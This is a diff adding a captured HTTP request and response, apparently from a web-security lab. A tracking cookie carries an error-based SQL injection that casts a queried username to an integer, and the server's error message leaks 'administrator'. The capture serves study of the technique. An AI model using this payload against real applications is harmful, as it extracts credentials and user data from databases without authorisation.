@@ -1,0 +1,9 @@
+GET /filter?category=Gifts HTTP/1.1
+Host: lab-shop.local
+Cookie: TrackingId=u8X9kLm2PqR1' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--; session=<REDACTED_LAB_SESSION>
+
+=== RESPONSE ===
+HTTP/1.1 500 Internal Server Error
+Content-Type: text/plain
+
+ERROR: invalid input syntax for type integer: "administrator"
